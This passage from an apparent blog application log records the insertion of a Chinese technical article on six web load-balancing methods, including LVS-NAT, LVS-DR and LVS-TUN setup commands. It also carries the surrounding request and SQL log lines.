255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">-g 就意味着使用直接路由的方式转发数据包</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">LVS-DR 相较于LVS-NAT的最大优势在于LVS-DR不受调度器宽带的限制，例如假设三台服务器在WAN交换机出口宽带都限制为10Mbps，只要对于连接调度器和两台实际服务器的LAN交换机没有限速，那么，使用LVS-DR理论上可以达到20Mbps的最大出口宽带，因为它的实际服务器的响应数据包可以不经过调度器而直接发往用户端啊，所以它与调度器的出口宽带没有关系，只能自身的有关系。而如果使用LVS-NAT，集群只能最大使用10Mbps的宽带。所以，越是响应数据包远远超过请求数据包的服务，就越应该降低调度器转移请求的开销，也就越能提高整体的扩展能力，最终也就越依赖于WAN出口宽带。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">总的来说，LVS-DR适合搭建可扩展的负载均衡系统，不论是Web服务器还是文件服务器，以及视频服务器，它都拥有出色的性能。前提是你必须为实际器购买一系列的合法IP地址。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t5"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">六、IP隧道(LVS-TUN)</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">基于IP隧道的请求转发机制：将调度器收到的IP数据包封装在一个新的IP数据包中，转交给实际服务器，然后实际服务器的响应数据包可以直接到达用户端。目前Linux大多支持，可以用LVS来实现，称为LVS-TUN，与LVS-DR不同的是，实际服务器可以和调度器不在同一个WANt网段，调度器通过IP隧道技术来转发请求到实际服务器，所以实际服务器也必须拥有合法的IP地址。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">总体来说，LVS-DR和LVS-TUN都适合响应和请求不对称的Web服务器，如何从它们中做出选择，取决于你的网络部署需要，因为LVS-TUN可以将实际服务器根据需要部署在不同的地域，并且根据就近访问的原则来转移请求，所以有类似这种需求的，就应该选择LVS-TUN。</span></p><p><br/></p>',
  'is_tui' => '1',
  'status' => '1',
  'views' => '1',
  'auth' => '韩会强',
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000302s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000862s ]
[ sql ] [ SQL ] INSERT INTO `think_article` (`title` , `cate_id` , `type` , `keyword` , `remark` , `content` , `is_tui` , `status` , `views` , `auth` , `photo` , `ip` , `update_time` , `create_time`) VALUES ('六大Web负载均衡原理与实现' , 29 , 0 , '负载均衡,' , '开头先理解一下所谓的“均衡”\r\n不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。' , '<p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">开头先理解一下所谓的“均衡”</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t0\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">一、http重定向</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">当http代理（比如浏览器）向web服务器请求某个URL后，web服务器可以通过http响应头信息中的Location标记来返回一个新的URL。这意味着HTTP代理需要继续请求这个新的URL，完成自动跳转。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">性能缺陷：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、吞吐率限制</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">主站点服务器的吞吐率平均分配到了被转移的服务器。现假设使用RR（Round Robin）调度策略，子服务器的最大吞吐率为1000reqs/s，那么主服务器的吞吐率要达到3000reqs/s才能完全发挥三台子服务器的作用，那么如果有100台子服务器，那么主服务器的吞吐率可想而知得有大？相反，如果主服务的最大吞吐率为6000reqs/s，那么平均分配到子服务器的吞吐率为2000reqs/s，而现子服务器的最大吞吐率为1000reqs/s，因此就得增加子服务器的数量，增加到6个才能满足。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、重定向访问深度不同</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">有的重定向一个静态页面，有的重定向相比复杂的动态页面，那么实际服务器的负载差异是不可预料的，而主站服务器却一无所知。因此整站使用重定向方法做负载均衡不太好。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">我们需要权衡转移请求的开销和处理实际请求的开销，前者相对于后者越小，那么重定向的意义就越大，例如下载。你可以去很多镜像下载网站试下，会发现基本下载都使用了Location做了重定向。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t1\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">二、DNS负载均衡</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">DNS负责提供域名解析服务，当访问某个站点时，实际上首先需要通过该站点域名的DNS服务器来获取域名指向的IP地址，在这一过程中，DNS服务器完成了域名到IP地址的映射，同样，这样映射也可以是一对多的，这时候，DNS服务器便充当了负载均衡调度器，它就像http重定向转换策略一样，将用户的请求分散到多台服务器上，但是它的实现机制完全不同。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">使用dig命令来看下&quot;baidu&quot;的DNS设置</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\"><img alt=\"\" src=\"http://img.blog.csdn.net/20141120181216406\" style=\"border: 0px; max-width: 100%;\"/><br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">可见baidu拥有三个A记录</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">相比http重定向，基于DNS的负载均衡完全节省了所谓的主站点，或者说DNS服务器已经充当了主站点的职能。但不同的是，作为调度器，DNS服务器本身的性能几乎不用担心。因为DNS记录可以被用户浏览器或者互联网接入服务商的各级DNS服务器缓存，只有当缓存过期后才会重新向域名的DNS服务器请求解析。也说是DNS不存在http的吞吐率限制，理论上可以无限增加实际服务器的数量。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">特性:</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、可以根据用户IP来进行<a href=\"http://lib.csdn.net/base/aiplanning\" class=\"replace_word\" title=\"人工智能规划与决策知识库\" target=\"_blank\" style=\"color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;\">智能</a>解析。DNS服务器可以在所有可用的A记录中寻找离用记最近的一台服务器。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、动态DNS：在每次IP地址变更时，及时更新DNS服务器。当然，因为缓存，一定的延迟不可避免。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">不足：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、没有用户能直接看到DNS解析到了哪一台实际服务器，加服务器运维人员的调试带来了不便。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、策略的局限性。例如你无法将HTTP请求的上下文引入到调度策略中，而在前面介绍的基于HTTP重定向的负载均衡系统中，调度器工作在HTTP层面，它可以充分理解HTTP请求后根据站点的应用逻辑来设计调度策略，比如根据请求不同的URL来进行合理的过滤和转移。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">3、如果要根据实际服务器的实时负载差异来调整调度策略，这需要DNS服务器在每次解析操作时分析各服务器的健康状态，对于DNS服务器来说，这种自定义开发存在较高的门槛，更何况大多数站点只是使用第三方DNS服务。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">4、DNS记录缓存，各级节点的DNS服务器不同程序的缓存会让你晕头转向。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">5、基于以上几点，DNS服务器并不能很好地完成工作量均衡分配，最后，是否选择基于DNS的负载均衡方式完全取决于你的需要。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t2\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">三、反向代理负载均衡</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">这个肯定大家都有所接触，因为几乎所有主流的Web服务器都热衷于支持基于反向代理的负载均衡。它的核心工作就是转发HTTP请求。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">相比前面的HTTP重定向和DNS解析，反向代理的调度器扮演的是用户和实际服务器中间人的角色：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、任何对于实际服务器的HTTP请求都必须经过调度器</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、调度器必须等待实际服务器的HTTP响应，并将它反馈给用户（前两种方式不需要经过调度反馈，是实际服务器直接发送给用户）</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">特性：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、调度策略丰富。例如可以为不同的实际服务器设置不同的权重，以达到能者多劳的效果。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、对反向代理服务器的并发处理能力要求高，因为它工作在HTTP层面。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">3、反向代理服务器进行转发操作本身是需要一定开销的，比如创建线程、与后端服务器建立TCP连接、接收后端服务器返回的处理结果、分析HTTP头部信息、用户空间和内核空间的频繁切换等，虽然这部分时间并不长，但是当后端服务器处理请求的时间非常短时，转发的开销就显得尤为突出。例如请求静态文件，更适合使用前面介绍的基于DNS的负载均衡方式。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">4、反向代理服务器可以监控后端服务器，比如系统负载、响应时间、是否可用、TCP连接数、流量等，从而根据这些数据调整负载均衡的策略。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">5、反射代理服务器可以让用户在一次会话周期内的所有请求始终转发到一台特定的后端服务器上（粘滞会话），这样的好处一是保持session的本地访问，二是防止后端服务器的动态内存缓存的资源浪费。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t3\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">四、IP负载均衡(LVS-NAT)</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">因为反向代理服务器工作在HTTP层，其本身的开销就已经严重制约了可扩展性，从而也限制了它的性能极限。那能否在HTTP层面以下实现负载均衡呢？</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">NAT服务器:它工作在传输层，它可以修改发送来的IP数据包，将数据包的目标地址修改为实际服务器地址。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">从Linux2.4内核开始，其内置的Neftilter模块在内核中维护着一些数据包过滤表，这些表包含了用于控制数据包过滤的规则。可喜的是，<a href=\"http://lib.csdn.net/base/linux\" class=\"replace_word\" title=\"Linux知识库\" target=\"_blank\" style=\"color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;\">Linux</a>提供了iptables来对过滤表进行插入、修改和删除等操作。更加令人振奋的是，Linux2.6.x内核中内置了IPVS模块，它的工作性质类型于Netfilter模块，不过它更专注于实现IP负载均衡。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">想知道你的服务器内核是否已经安装了IPVS模块，可以</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\"><img alt=\"\" src=\"http://img.blog.csdn.net/20141121164600671\" style=\"border: 0px; max-width: 100%;\"/><br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">有输出意味着IPVS已经安装了。IPVS的管理工具是ipvsadm，它为提供了基于命令行的配置界面，可以通过它快速实现负载均衡系统。这就是大名鼎鼎的LVS(<a href=\"http://lib.csdn.net/base/linux\" class=\"replace_word\" title=\"Linux知识库\" target=\"_blank\" style=\"color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;\">linux</a>&nbsp;Virtual Server，Linux虚拟服务器)。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、打开调度器的数据包转发选项</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、检查实际服务器是否已经将NAT服务器作为自己的默认网关，如果不是，如添加</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">route add default gw xx.xx.xx.xx</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">3、使用ipvsadm配置</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -A -t 111.11.11.11:80 -s rr &nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">添加一台虚拟服务器，-t 后面是服务器的外网ip和端口，-s rr是指采用简单轮询的RR调度策略（这属于静态调度策略，除此之外，LVS还提供了系列的动态调度策略，比如最小连接（LC）、带权重的最小连接（WLC），最短期望时间延迟（SED）等）</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -a -t 111.11.11.11:80 -r 10.10.120.210:8000 -m &nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">ipvsadm -a -t 111.11.11.11:80 -r 10.10.120.211:8000 -m &nbsp;<br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">添加两台实际服务器（不需要有外网ip），-r后面是实际服务器的内网ip和端口，-m表示采用NAT方式来转发数据包</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">运行ipvsadm -L -n可以查看实际服务器的状态。这样就大功告成了。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">实验证明使用基于NAT的负载均衡系统。作为调度器的NAT服务器可以将吞吐率提升到一个新的高度，几乎是反向代理服务器的两倍以上，这大多归功于在内核中进行请求转发的较低开销。但是一旦请求的内容过大时，不论是基于反向代理还是NAT，负载均衡的整体吞吐量都差距不大，这说明对于一睦开销较大的内容，使用简单的反向代理来搭建负载均衡系统是值考虑的。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">这么强大的系统还是有它的瓶颈，那就是NAT服务器的网络带宽，包括内部网络和外部网络。当然如果你不差钱，可以去花钱去购买千兆交换机或万兆交换机，甚至负载均衡硬件设备，但如果你是个屌丝，咋办？</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">一个简单有效的办法就是将基于NAT的集群和前面的DNS混合使用，比如５个100Mbps出口宽带的集群，然后通过DNS来将用户请求均衡地指向这些集群，同时，你还可以利用DNS智能解析实现地域就近访问。这样的配置对于大多数业务是足够了，但是对于提供下载或视频等服务的大规模站点，NAT服务器还是不够出色。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">&nbsp;</span></p><h1 style=\"margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);\"><a target=\"_blank\" style=\"color: rgb(51, 102, 153);\" name=\"t4\"></a><span style=\"font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;\">五、直接路由(LVS-DR)</span></h1><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">NAT是工作在网络分层模型的传输层（第四层），而直接路由是工作在数据链路层（第二层），貌似更屌些。它通过修改数据包的目标MAC地址（没有修改目标IP），将数据包转发到实际服务器上，不同的是，实际服务器的响应数据包将直接发送给客户羰，而不经过调度器。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">1、网络设置</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">这里假设一台负载均衡调度器，两台实际服务器，购买三个外网ip，一台机一个，三台机的默认网关需要相同，最后再设置同样的ip别名，这里假设别名为10.10.120.193。这样一来，将通过10.10.120.193这个IP别名来访问调度器，你可以将站点的域名指向这个IP别名。</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">2、将ip别名添加到回环接口lo上</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">这是为了让实际服务器不要去寻找其他拥有这个IP别名的服务器，在实际服务器中运行：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\"><img alt=\"\" src=\"http://img.blog.csdn.net/20141121180709578\" style=\"border: 0px; max-width: 100%;\"/><br/></span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">另外还要防止实际服务器响应来自网络中针对IP别名的ARP广播，为此还要执行：</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span></p><p style=\"color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"font-family: &quot;Microsoft YaHei&quot;;\">echo &quot;2&quot; &gt; 